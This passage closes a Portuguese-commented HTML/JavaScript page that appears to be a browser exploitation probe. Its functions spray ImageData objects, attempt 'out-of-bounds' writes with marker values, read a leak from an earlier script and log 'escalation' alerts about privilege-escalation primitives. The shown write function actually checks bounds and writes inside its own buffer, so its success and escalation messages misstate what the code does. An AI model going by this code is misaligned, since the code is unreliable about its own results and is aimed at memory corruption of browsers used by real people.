                     const readbackImageData = ctx.getImageData(gridX, gridY, imgDataWidth, imgDataHeight);
                     const readbackData = readbackImageData.data; // Uint8ClampedArray

                     // 3. Comparar com os dados originais (branco FF) ou com o padrão OOB
                     for(let k=0; k < readbackData.length; k += 4){ // Iterar sobre pixels (RGBA)
                         const r = readbackData[k];
                         const g = readbackData[k+1];
                         const b = readbackData[k+2];
                         const a = readbackData[k+3];

                         // Se não for branco (FF,FF,FF,FF), algo mudou
                         if(r !== 255 || g !== 255 || b !== 255 || a !== 255){
                             const pixelIndex = k / 4;
                             logCanvas(`---> CORRUPÇÃO DETECTADA em ImageData ${i} @ pixel ${pixelIndex}! RGBA=(${r},${g},${b},${a})`, 'critical', FNAME);
                             potentialCorruptionDetected = true;
                             corruptionRead = true; // Marcar que *esta* imagem está corrompida

                             // Verificar se corresponde ao padrão OOB escrito (BB BB BB BB ou CC CC CC CC)
                             // Lembre-se que writeValue1/2 são U32, precisamos comparar os bytes individuais
                             const byte1 = writeValue1 & 0xFF; // B = 0x42 = 66
                             const byte2 = (writeValue1 >> 8) & 0xFF;
                             const byte3 = (writeValue1 >> 16) & 0xFF;
                             const byte4 = (writeValue1 >> 24) & 0xFF;
                             const byte5 = writeValue2 & 0xFF; // C = 0x43 = 67
                             // ... (assumindo que writeValue1 e 2 são 0x42424242 e 0x43434343)

                             let matchesPattern = false;
                              if (r === byte1 && g === byte2 && b === byte3 && a === byte4) {
                                 matchesPattern = true;
                                 logCanvas(`    -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME);
                              } else if (r === byte5 && readbackData[k+4] === ((writeValue2>>8)&0xFF)) { // Verificar bytes subsequentes para o segundo valor
                                 // Aproximação: verificar se o próximo pixel começa com o segundo padrão
                                 // Uma verificação mais robusta compararia a sequência exata de 8 bytes
                                  matchesPattern = true;
                                 logCanvas(`    -> Padrão OOB 2 (0x${writeValue2.toString(16)}) detectado (início)!`, 'vuln', FNAME);
                              }


                             if (matchesPattern) {
                                 patternMatched = true;
                                 logCanvas(` ---> *** ALERTA: Padrão OOB Write específico lido de volta do ImageData! Confirma Corrupção Controlada! ***`, 'escalation', FNAME);
                             }
                             break; // Parar de verificar pixels nesta imagem se corrupção foi encontrada
                         }
                     } // Fim loop pixels
                 }catch(e){
                     logCanvas(`Erro durante put/getImageData para ImageData ${i}: ${e.message}`, 'error', FNAME);
                     console.error(`Erro ImgData ${i}:`, e);
                     errorOccurred=true;
                     potentialCorruptionDetected = true; // Erro pode indicar corrupção subjacente
                 }

                 // Pausa curta entre verificações para não sobrecarregar
                 if(i % 5 === 0) await PAUSE(5);
            } // Fim loop ImageData

            logCanvas(`Verificação de ${sprayedImagesData.length} ImageData concluída.`, 'subtest', FNAME);
            if (patternMatched) {
                 logCanvas(`SUCESSO: Corrupção detectada E padrão OOB escrito foi lido de volta de um ImageData!`, 'vuln', FNAME);
            } else if (potentialCorruptionDetected) {
                 logCanvas(`AVISO: Corrupção/Erro detectado em algum ImageData, mas padrão OOB específico não foi confirmado na leitura.`, 'warn', FNAME);
                 logCanvas(` ---> *** ALERTA: Corrupção de memória instável detectada afetando ImageData! Investigar. ***`, 'escalation', FNAME);
            } else if (oobWritePerformed) {
                 logCanvas(`Nenhuma corrupção detectada nos ImageData lidos do canvas (apesar da escrita OOB ter sido realizada).`, 'good', FNAME);
            } else {
                 logCanvas(`Nenhuma corrupção detectada e escrita OOB não foi realizada/falhou.`, 'good', FNAME);
            }
            logCanvas(`-> Verifique visualmente o canvas acima para pixels que não sejam brancos.`, 'info', FNAME);

            logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME);
            await PAUSE();
            // Não retorna valor, apenas loga
        };


        const testOOBWriteOnly = async () => {
             // Esta função é um wrapper mais simples, apenas para realizar a escrita
             // Útil para ser chamada antes de testes que podem ser afetados por ela (como WebGL)
            const FNAME = 'testOOBWriteOnly';
            logCanvas("--- Teste: OOB Write Only ---",'test', FNAME);
            const bufferOOBSize=64;
            const writeValue1=0xDEADBEEF; // Valor diferente para este teste
            const writeValue2=0xCAFEBABE;
            const writeValueSize = 8; // 2x U32
             const allocationSize = bufferOOBSize + 256;
             const baseOffsetInBuffer = 128;

            let bufferOOB=null;
            let dv=null;
            let writeSuccess=false;

            try{
                 logCanvas(`Alocando buffer ctrl (${allocationSize}B)...`, 'info', FNAME);
                 bufferOOB=new ArrayBuffer(allocationSize);
                 dv=new DataView(bufferOOB);
                 for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD); // Padrão
                 logCanvas(`Buffer ctrl alocado e preenchido com 0xDD.`, 'info', FNAME);
            }catch(e){
                 logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME);
                 console.error(e);
                 return false; // Retorna falha se não puder alocar
            }

             const oobWriteOffset = bufferOOBSize; // Relativo ao início útil
             const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset;
             const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`;

             logCanvas(`Tentando escrita OOB U32x2 @ ${relOffsetStr} (Val=${toHexCanvas(writeValue1)}/${toHexCanvas(writeValue2)})...`, 'subtest', FNAME);
             try{
                 if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){
                     dv.setUint32(targetWriteAddr, writeValue1, true);
                     dv.setUint32(targetWriteAddr + 4, writeValue2, true);
                     logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK.`, 'vuln', FNAME);
                      logCanvas(` ---> *** ALERTA: Primitivo Relevante para Escalação de Privilégios (Corrupção de Memória OOB Write) ***`, 'escalation', FNAME);
                     writeSuccess=true;
                 } else {
                     logCanvas(`Offset OOB ${relOffsetStr} fora do buffer alocado.`, 'error', FNAME);
                 }
             }catch(e){
                 logCanvas(`Escrita OOB U32x2 falhou: ${e.message}`, 'warn', FNAME);
             }
             logCanvas("--- Teste OOB Write Only Concluído ---",'test', FNAME);
             await PAUSE();
             return writeSuccess; // Retorna true se a escrita foi realizada sem erro
        };


        // =======================================================================
        // === FUNÇÃO PRINCIPAL DE TESTE DO CANVAS (v14 Detailed Logs) ==
        // =======================================================================
        const runCanvasTestSequence = async () => {
            const FNAME = 'runCanvasTestSequence';
            outputDivCanvas = document.getElementById('output-canvas');
            coordStatusDiv = document.getElementById('canvas-coord-status');
            canvasElement = document.getElementById('interactive-canvas');
            const runBtnCanvas = document.getElementById('runCanvasBtn');

            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) {
                const errorMsg = "ERRO FATAL S2: Elementos HTML essenciais não encontrados!";
                try { logCanvas(errorMsg, "critical", FNAME); } catch(e){}
                console.error(errorMsg);
                alert(errorMsg); // Alerta para garantir visibilidade
                return;
            }
            if (runBtnCanvas) runBtnCanvas.disabled = true;
            outputDivCanvas.innerHTML = ''; // Limpar log anterior
            logCanvas("Iniciando sequência focada do Script 2 (v14 Detailed Logs)...", "test", FNAME);

            // Inicializar quadrados interativos
            imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY;
            for (let i = 0; i < 5; i++) { imgSquares.push({ id: `imgSq${i}`, x: sqX, y: sqY, size: imgSquareSize, color: 'green', hover: false }); sqX += imgSquareSize + imgSquareSpacing; }
            logCanvas(`Criados ${imgSquares.length} quadrados interativos.`, 'info', FNAME);

            try {
                // 0. Obter contexto 2D e Ler leak S1
                try {
                    ctx = canvasElement.getContext('2d');
                    if (!ctx) throw new Error("Falha ao obter contexto 2D.");
                    logCanvas("Contexto 2D obtido com sucesso.", 'good', FNAME);
                } catch(e) {
                    logCanvas(`Falha crítica ao obter contexto 2D: ${e.message}`, 'critical', FNAME);
                    throw e; // Abortar se não puder desenhar
                }
                redrawAll(); // Desenhar estado inicial
                await PAUSE();

                logCanvas("Tentando ler leak OOB do Script 1...", 'subtest', FNAME);
                try {
                     // Verificar se a variável global do Script 1 existe
                     if (typeof leakedValueFromOOB !== 'undefined') {
                         const l = leakedValueFromOOB;
                         if(l){
                             const ls = l.type==='U64'
                                 ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`
                                 : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`;
                             logCanvas(`-> Leak S1 encontrado: ${ls}`, 'leak', FNAME);
                             currentLeakData = {text: ls, color: "#FF9800"}; // Amarelo vazamento
                         } else {
                             logCanvas(`-> Leak S1 NULO (não encontrado ou não vazou).`, 'warn', FNAME);
                             currentLeakData = {text:"L(S1):NULO", color:"#FFC107"}; // Laranja aviso
                         }
                    } else {
                         logCanvas(`-> Variável global 'leakedValueFromOOB' do Script 1 não definida.`, 'error', FNAME);
                         currentLeakData = {text:"L(S1):Var N/A", color:"#F44336"}; // Vermelho erro
                     }
                 } catch (e) {
                     logCanvas(`Erro ao acessar leak S1: ${e.message}`, 'error', FNAME);
                     currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; // Vermelho erro
                     console.error(e);
                 }
                 redrawAll(); // Atualizar canvas com status do leak
                 await PAUSE();

                // --- Executar testes FOCADOS em sequência ---
                let lastOOBWriteSuccess = false; // Track OOB write success for potential interaction logging

                await testWebGLCheck(); // 1. Verifica WebGL
                if (!glContext) {
                    logCanvas("WebGL não disponível, alguns testes serão pulados.", "warn", FNAME);
                }

                await testAdvancedPP(); // 2. Testa PP Avançado+

                await testOOBReadEnhanced(); // 3. Tenta Info Leak OOB+ (Scan amplo)

                await testOOBWriteMetadata(); // 4. Tenta OOB Write -> Metadata (Corrupção de byteLength)
                // Não temos como saber facilmente se *este* teste específico foi o que deu certo
                // em termos de escrita OOB, então vamos confiar no testOOBWriteOnly abaixo.

                // 5. Tenta OOB Write isolado e depois roda teste WebGL detalhado+
                logCanvas("--- Iniciando Teste de Interação: OOB Write -> WebGL ---", 'test', FNAME);
                lastOOBWriteSuccess = await testOOBWriteOnly(); // Tenta OOB write
                 if (glContext) {
                     logCanvas(`WebGL está ATIVO. Executando teste WebGL detalhado ${lastOOBWriteSuccess ? 'APÓS' : 'SEM'} OOB Write bem sucedido...`, 'info', FNAME);
                     await testWebGLDeeperPlus(); // Roda teste WebGL com CHECKS DE ERRO
                     if (lastOOBWriteSuccess) {
                         // Se WebGL funcionou sem erros *após* um OOB write, pode ser interessante
                          logCanvas(` ---> *** ALERTA POTENCIAL: WebGL funcionou sem erros após OOB Write. Investigar possível corrupção benigna ou interação não detectada. ***`, 'escalation', FNAME);
                     }
                 } else {
                     logCanvas("WebGL indisponível, pulando teste WebGL detalhado pós-OOB.", 'warn', FNAME);
                 }
                 logCanvas("--- Teste de Interação: OOB Write -> WebGL Concluído ---", 'test', FNAME);
                 await PAUSE();

                // 6. Teste OOB Write -> ImageData Check (Refinado)
                // Este teste faz sua própria escrita OOB internamente
                await testOOBWriteToImageDataCheck();

                logCanvas("--- Sequência principal de testes focados concluída ---", 'test', FNAME);
                await PAUSE(100);

                // Adicionar Listeners Interativos (Canvas + Quadrados com ações)
                logCanvas("Adicionando listeners interativos (Canvas + Quadrados)...", 'subtest', FNAME);
                 // Remover listeners antigos se existirem (caso o botão seja clicado múltiplas vezes)
                if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} }
                if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }

                // Listener de movimento (com hover para quadrados)
                canvasMoveListener = (event) => {
                    try{
                        const r = canvasElement.getBoundingClientRect();
                        const x = event.clientX - r.left;
                        const y = event.clientY - r.top;
                        let needsRedraw = false;
                        let foundTargetId = null;
                        let cursorStyle = 'default';
                        let currentSquareHover = -1; // Reset hover status

                         // Check interactive areas first
                        for(const a of interactiveAreas){
                            if(x>=a.x && x<=a.x+a.w && y>=a.y && y<=a.y+a.h){
                                foundTargetId=a.id;
                                cursorStyle='pointer';
                                break;
                            }
                        }
                        // Check image squares if no area found
                        if(!foundTargetId){
                            for(let i=0; i<imgSquares.length; i++){
                                const sq=imgSquares[i];
                                if(x>=sq.x && x<=sq.x+sq.size && y>=sq.y && y<=sq.y+sq.size){
                                    foundTargetId=sq.id;
                                    cursorStyle='crosshair';
                                    currentSquareHover=i;
                                    if(!sq.hover){ sq.hover=true; needsRedraw=true; }
                                } else {
                                     if(sq.hover){ sq.hover=false; needsRedraw=true; }
                                }
                            }
                        } else {
                             // Reset square hover if mouse is over an area
                             imgSquares.forEach(sq=>{if(sq.hover){sq.hover=false; needsRedraw=true;}});
                        }

                        // Update global hover target and redraw if needed
                        if(foundTargetId !== currentHoverTarget){
                            currentHoverTarget = foundTargetId;
                            needsRedraw = true; // Need to redraw if hover target changes
                        }

                        if(needsRedraw){ redrawAll(); }
                        canvasElement.style.cursor = cursorStyle;
                        if(coordStatusDiv) coordStatusDiv.textContent=`Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`;
                    }catch(e){
                        logCanvas(`Erro no listener de mousemove: ${e.message}`, 'error', 'MouseMove');
                        console.error(e);
                    }
                };

                // Listener de clique (com ações específicas por quadrado)
                canvasClickListener = async (event) => {
                    const FNAME_CLICK = 'CanvasClick';
                     try{
                         const r=canvasElement.getBoundingClientRect();
                         const x=event.clientX-r.left;
                         const y=event.clientY-r.top;
                         let clickedArea=null;
                         let clickedSquareIndex=-1;

                         // Check interactive areas
                         for(const a of interactiveAreas){if(x>=a.x && x<=a.x+a.w && y>=a.y && y<=a.y+a.h){ clickedArea = a; break; }}
                         // Check squares if no area clicked
                         if(!clickedArea){for(let i = 0; i < imgSquares.length; i++){ const sq = imgSquares[i]; if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size){ clickedSquareIndex = i; break; } } }

                         if(clickedArea){
                             logCanvas(`--> Click Área Interativa: ${clickedArea.text} (ID: ${clickedArea.id})`,'vuln', FNAME_CLICK);
                             switch(clickedArea.id){
                                 case 'rect-log':
                                     logCanvas("Ação: Log de clique simples.",'info', FNAME_CLICK);
                                     break;
                                 case 'rect-link':
                                     logCanvas("Ação: Tentando abrir link https://google.com em nova aba...",'warn', FNAME_CLICK);
                                     try{
                                         const nW=window.open('https://google.com','_blank');
                                         if(!nW) logCanvas('Falha ao abrir pop-up (bloqueado pelo navegador?).','warn', FNAME_CLICK);
                                         else logCanvas('window.open chamado OK (verificar se aba abriu).','good', FNAME_CLICK);
                                     }catch(e){
                                         logCanvas('Erro ao chamar window.open: '+e.message,'error', FNAME_CLICK);
                                     }
                                     break;
                                 case 'rect-rerun':
                                     logCanvas("Ação: Re-lendo Leak S1...",'info', FNAME_CLICK);
                                     // Re-executar a lógica de leitura do leak
                                     try { if (typeof leakedValueFromOOB !== 'undefined') { const l=leakedValueFromOOB; if(l){ const lS=l.type==='U64'?`ReL:U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`:`ReL:U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> ${lS}`,'leak', FNAME_CLICK); currentLeakData={text:lS,color:"#FF9800"};}else{logCanvas(`-> Leak S1 NULO.`,'warn', FNAME_CLICK); currentLeakData={text:"ReL:NULO",color:"#FFC107"};}}else{logCanvas(`-> Var leakedValueFromOOB N/A.`,'error', FNAME_CLICK); currentLeakData={text:"ReL:Var N/A",color:"#F44336"};}}catch(e){logCanvas(`Erro re-ler leak S1: ${e.message}`,'error', FNAME_CLICK); currentLeakData={text:"ReL:ERRO",color:"#F44336"};}
                                     redrawAll(); // Atualizar display do leak no canvas
                                     break;
                             }
                        } else if (clickedSquareIndex !== -1){
                             const sq = imgSquares[clickedSquareIndex];
                             logCanvas(`--> Click Quadrado Interativo ID: ${sq.id}`, 'vuln', FNAME_CLICK);
                             let actionError = null;
                             // Desativar botão principal durante re-run
                             if (runBtnCanvas) runBtnCanvas.disabled = true;
                             logCanvas(`Executando ação para ${sq.id}...`, 'test', FNAME_CLICK);
                             try {
                                 switch(sq.id) {
                                     case 'imgSq0': logCanvas("Re-run: PP Avançado...", 'subtest', FNAME_CLICK); await testAdvancedPP(); break;
                                     case 'imgSq1': logCanvas("Re-run: OOB Read Scan...", 'subtest', FNAME_CLICK); await testOOBReadEnhanced(); break;
                                     case 'imgSq2': logCanvas("Re-run: OOB Write -> Metadata...", 'subtest', FNAME_CLICK); await testOOBWriteMetadata(); break;
                                     case 'imgSq3': logCanvas("Re-run: OOB Write -> ImageData Check...", 'subtest', FNAME_CLICK); await testOOBWriteToImageDataCheck(); break;
                                     case 'imgSq4': logCanvas("Re-run: WebGL Deep Plus...", 'subtest', FNAME_CLICK);
                                          if (!glContext) { logCanvas("WebGL não ativo, pulando re-run.", "warn", FNAME_CLICK); }
                                          else { await testWebGLDeeperPlus(); }
                                          break;
                                     default: logCanvas(`Ação não definida para ${sq.id}`, 'warn', FNAME_CLICK);
                                 }
                                 logCanvas(`Ação ${sq.id} concluída.`, 'good', FNAME_CLICK);
                             } catch (e) {
                                 logCanvas(`Erro durante ação ${sq.id}: ${e.message}`, 'error', FNAME_CLICK);
                                 console.error(`Erro ação ${sq.id}:`, e);
                                 actionError = e;
                             } finally {
                                 sq.color = actionError ? 'orange' : 'purple'; // Mudar cor do quadrado após execução
                                 redrawAll();
                                 if (runBtnCanvas) runBtnCanvas.disabled = false; // Reativar botão principal
                                 logCanvas(`Re-run ${sq.id} finalizado.`, 'test', FNAME_CLICK);
                             }
                         } else {
                             logCanvas(`--> Click fora de área interativa. x=${x.toFixed(0)}, y=${y.toFixed(0)}`,'info', FNAME_CLICK);
                         }
                    }catch(e){
                         logCanvas(`Erro GERAL no listener de clique: ${e.message}`,'error', FNAME_CLICK);
                         console.error(e);
                         // Reativar botão em caso de erro inesperado no handler
                         if (runBtnCanvas) runBtnCanvas.disabled = false;
                    }
                };

                canvasElement.addEventListener('click', canvasClickListener);
                canvasElement.addEventListener('mousemove', canvasMoveListener);
                logCanvas("Listeners de mouse (click, mousemove) adicionados ao canvas.", 'good', FNAME);
                redrawAll();
                logCanvas("-> TESTE INTERATIVO PRONTO <- Clique nas áreas ou quadrados!", 'info', FNAME);

            } catch(e) {
                 logCanvas(`Erro GERAL não tratado no SCRIPT 2: ${e.message}`, 'critical', FNAME);
                 console.error("Erro GERAL SCRIPT 2:", e);
                 if(e.stack) console.error(e.stack);
                 // Tentar reativar o botão em caso de erro fatal na sequência principal
                  if (runBtnCanvas) runBtnCanvas.disabled = false;
             }
             finally {
                 logCanvas("--- Fim da execução automática da sequência do Script 2 ---", 'test', FNAME);
                 // O botão já deve ter sido reativado se não houve erro fatal, mas garantimos aqui
                 // if (runBtnCanvas) runBtnCanvas.disabled = false; // Removido pois o botão deve ser reativado após cada ação de clique
             }
        };

        // --- Função wrapper chamada pelo botão HTML ---
        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        // --- Limpeza ao Descarregar ---
        window.addEventListener('unload', () => {
            console.log("[Canvas Unload] Limpando listeners...");
            try {
                if (canvasClickListener && canvasElement) canvasElement.removeEventListener('click', canvasClickListener);
                if (canvasMoveListener && canvasElement) canvasElement.removeEventListener('mousemove', canvasMoveListener);
            } catch(e) { console.error("[Canvas Unload] Erro ao remover listeners:", e); }
            console.log("[Canvas Unload] Limpeza OK.");
        });
        // --- FIM DO SCRIPT 2 ---
    </script>

</body>
</html>
